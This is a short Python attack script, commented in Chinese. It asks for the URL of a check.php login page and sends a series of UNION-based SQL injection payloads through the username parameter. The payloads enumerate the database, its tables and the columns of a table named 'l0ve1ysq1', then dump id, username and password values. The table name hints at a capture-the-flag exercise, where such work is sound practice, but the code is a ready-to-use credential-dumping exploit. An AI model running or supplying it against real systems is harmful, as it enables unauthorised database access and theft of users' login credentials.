import requests

# 输入 check.php 地址
url = input("请输入check.php地址: ")

# 要执行的 SQL 注入 Payload
payloads = [
    "1' union select 1,database(),3#",

    "1' union select 1,2,"
    "group_concat(table_name) "
    "from information_schema.tables "
    "where table_schema=database()#",

    "1' union select 1,2,"
    "group_concat(column_name) "
    "from information_schema.columns "
    "where table_name='l0ve1ysq1'#",

    "1' union select 1,2,"
    "group_concat(id,username,password) "
    "from l0ve1ysq1#"
]

# 依次执行 Payload
for p in payloads:

    data = {
        "username": p,
        "password": "1"
    }

    res = requests.get(url, params=data)

    print("\n" + "=" * 50)
    print("Payload：")
    print(p)

    print("\n返回结果：")
    print(res.text)